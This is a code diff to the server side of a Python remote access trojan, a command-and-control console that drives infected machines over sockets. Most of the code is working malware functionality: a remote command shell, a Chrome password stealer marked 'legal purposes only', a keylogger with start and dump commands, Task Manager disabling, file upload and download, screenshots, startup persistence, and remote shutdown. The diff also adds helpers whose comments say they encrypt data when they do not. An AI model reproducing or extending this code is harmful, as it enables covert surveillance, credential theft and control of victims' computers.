@@ -21,6 +21,8 @@ arrConnections = []
 strHost = "0.0.0.0"
 intPort = 3000
 
+intBuff = 1024
+
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
 
@@ -30,11 +32,17 @@ remove_quotes = lambda string: string.replace("\"", "")
 # function to return title centered around string
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
 
+# function to send encrypted data
+send = lambda data: conn.send(data)
+
+# function to receive and decrypt data
+recv = lambda buffer: conn.recv(buffer)
+
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
     while True:
-        bytPart = conn.recv(buffer)
+        bytPart = recv(buffer)
         if len(bytPart) == buffer:
             return bytPart
         bytData += bytPart
@@ -63,13 +71,12 @@ def socket_bind():
 
 
 def socket_accept():
-    global blnFirstRun, arrAddresses
     while True:
         try:
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
             arrConnections.append(conn)  # append connection to array
-            client_info = decode_utf8(conn.recv(1024)).split("`,")
+            client_info = decode_utf8(conn.recv(intBuff)).split("`,")
             address += client_info[0], client_info[1], client_info[2],
             arrAddresses.append(address)
             print("\n" + "Connection has been established: {0} ({1})".format(address[0], address[2]))
@@ -107,7 +114,7 @@ def main_menu():
         elif strChoice[:3] == "--c" and len(strChoice) > 3:
             conn = select_connection(strChoice[4:], "False")
             if conn is not None:
-                conn.send(str.encode("exit"))
+                send(str.encode("exit"))
                 conn.close()
 
         elif strChoice == "--x":
@@ -210,8 +217,8 @@ def user_info():
 
 
 def screenshot():
-    conn.send(str.encode("screen"))
-    strClientResponse = decode_utf8(conn.recv(1024))  # get info
+    send(str.encode("screen"))
+    strClientResponse = decode_utf8(recv(intBuff))  # get info
     print("\n" + strClientResponse)
 
     intBuffer = ""
@@ -230,10 +237,10 @@ def screenshot():
 
 
 def browse_files():
-    conn.send(str.encode("filebrowser"))
+    send(str.encode("filebrowser"))
     print("\n" + "Drives :")
 
-    strDrives = decode_utf8(conn.recv(1024))
+    strDrives = decode_utf8(recv(intBuff))
     print(strDrives + "\n")
 
     strDir = input("Directory: ")
@@ -242,9 +249,9 @@ def browse_files():
         # tell the client of the invalid directory
         strDir = "Invalid"
 
-    conn.send(str.encode(strDir))
+    send(str.encode(strDir))
 
-    strClientResponse = decode_utf8(conn.recv(1024))  # get buffer size
+    strClientResponse = decode_utf8(recv(intBuff))  # get buffer size
 
     if strClientResponse == "Invalid Directory!":  # if the directory is invalid
         print("\n" + strClientResponse)
@@ -257,10 +264,10 @@ def browse_files():
 
 
 def startup():
-    conn.send(str.encode("startup"))
+    send(str.encode("startup"))
     print("Registering ...")
 
-    strClientResponse = decode_utf8(conn.recv(1024))
+    strClientResponse = decode_utf8(recv(intBuff))
     if not strClientResponse == "success":
         print(strClientResponse)
 
@@ -275,18 +282,18 @@ def send_file():
     if strOutputFile == "":  # if the input is blank
         return
 
-    conn.send(str.encode("send" + str(os.path.getsize(strFile))))
+    send(str.encode("send" + str(os.path.getsize(strFile))))
 
     objFile = open(strFile, "rb")  # send file contents and close the file
     time.sleep(1)
-    conn.send(objFile.read())
+    send(objFile.read())
     objFile.close()
 
-    conn.send(str.encode(strOutputFile))
+    send(str.encode(strOutputFile))
 
     print("Total bytes sent: " + str(os.path.getsize(strFile)))
 
-    strClientResponse = decode_utf8(conn.recv(1024))
+    strClientResponse = decode_utf8(recv(intBuff))
     print(strClientResponse)
 
 
@@ -297,8 +304,8 @@ def receive():
     if strFile == "" or strFileOutput == "":  # if the user left an input blank
         return
 
-    conn.send(str.encode("recv" + strFile))
-    strClientResponse = decode_utf8(conn.recv(1024))
+    send(str.encode("recv" + strFile))
+    strClientResponse = decode_utf8(recv(intBuff))
 
     print(strClientResponse)
 
@@ -325,14 +332,14 @@ def receive():
 
 
 def command_shell():  # remote cmd shell
-    conn.send(str.encode("cmd"))
-    strDefault = "\n" + decode_utf8(conn.recv(1024)) + ">"
+    send(str.encode("cmd"))
+    strDefault = "\n" + decode_utf8(recv(intBuff)) + ">"
     print(strDefault, end="")  # print default prompt
 
     while True:
         strCommand = input()
         if strCommand == "quit" or strCommand == "exit":
-            conn.send(str.encode("goback"))
+            send(str.encode("goback"))
             break
 
         elif strCommand == "cmd":  # commands that do not work
@@ -340,8 +347,8 @@ def command_shell():  # remote cmd shell
             print(strDefault, end="")
 
         elif len(strCommand) > 0:
-            conn.send(str.encode(strCommand))
-            intBuffer = int(decode_utf8(conn.recv(1024)))  # receive buffer size
+            send(str.encode(strCommand))
+            intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
             strClientResponse = decode_utf8(recvall(intBuffer))
             print(strClientResponse, end="")  # print cmd output
         else:
@@ -349,13 +356,13 @@ def command_shell():  # remote cmd shell
 
 
 def disable_taskmgr():
-    conn.send(str.encode("dtaskmgr"))
-    print(decode_utf8(conn.recv(1024)))  # print response
+    send(str.encode("dtaskmgr"))
+    print(decode_utf8(recv(intBuff)))  # print response
 
 
 def chrpass():  # legal purposes only!
-    conn.send(str.encode("chrpass"))
-    strClientResponse = decode_utf8(conn.recv(1024))
+    send(str.encode("chrpass"))
+    strClientResponse = decode_utf8(recv(intBuff))
 
     if strClientResponse == "noexist":
         print("Google Chrome is not installed on target.")
@@ -364,9 +371,9 @@ def chrpass():  # legal purposes only!
     if strClientResponse == "error":
         strClose = input("Browser is currently in use. Would you like to close it? y/n ")
         if strClose == "y":
-            conn.send(str.encode("close"))
+            send(str.encode("close"))
         else:
-            conn.send(str.encode("stay"))
+            send(str.encode("stay"))
         return
     else:
         intBuffer = int(strClientResponse)
@@ -376,18 +383,18 @@ def chrpass():  # legal purposes only!
 
 def keylogger(option):
     if option == "start":
-        conn.send(str.encode("keystart"))
-        if decode_utf8(conn.recv(1024)) == "error":
+        send(str.encode("keystart"))
+        if decode_utf8(recv(intBuff)) == "error":
             print("Keylogger is already running.")
 
     elif option == "stop":
-        conn.send(str.encode("keystop"))
-        if decode_utf8(conn.recv(1024)) == "error":
+        send(str.encode("keystop"))
+        if decode_utf8(recv(intBuff)) == "error":
             print("Keylogger is not running.")
 
     elif option == "dump":
-        conn.send(str.encode("keydump"))
-        intBuffer = decode_utf8(conn.recv(1024))
+        send(str.encode("keydump"))
+        intBuffer = decode_utf8(recv(intBuff))
 
         if intBuffer == "error":
             print("Keylogger is not running.")
@@ -399,8 +406,8 @@ def keylogger(option):
 
 
 def send_command(command):
-    conn.send(str.encode("runcmd" + command))
-    intBuffer = int(decode_utf8(conn.recv(1024)))  # receive buffer size
+    send(str.encode("runcmd" + command))
+    intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
 
     strClientResponse = "========================" + "\n" + arrInfo[0] + 4*" " + arrInfo[1] + \
                         decode_utf8(recvall(intBuffer)) + \
@@ -445,15 +452,15 @@ def send_commands():
                 print("\n", end="")
                 show_help()
             elif strChoice == "--c":
-                conn.send(str.encode("exit"))
+                send(str.encode("exit"))
                 conn.close()
                 break
             elif strChoice[:3] == "--m" and len(strChoice) > 3:
                 strMsg = "msg" + strChoice[4:]
-                conn.send(str.encode(strMsg))
+                send(str.encode(strMsg))
             elif strChoice[:3] == "--o" and len(strChoice) > 3:
                 strSite = "site" + strChoice[4:]
-                conn.send(str.encode(strSite))
+                send(str.encode(strSite))
             elif strChoice == "--a":
                 startup()
             elif strChoice == "--u":
@@ -467,13 +474,13 @@ def send_commands():
             elif strChoice == "--r":
                 receive()
             elif strChoice == "--x 1":
-                conn.send(str.encode("lock"))
+                send(str.encode("lock"))
             elif strChoice == "--x 2":
-                conn.send(str.encode("shutdown"))
+                send(str.encode("shutdown"))
                 conn.close()
                 break
             elif strChoice == "--x 3":
-                conn.send(str.encode("restart"))
+                send(str.encode("restart"))
                 conn.close()
                 break
             elif strChoice == "--b":
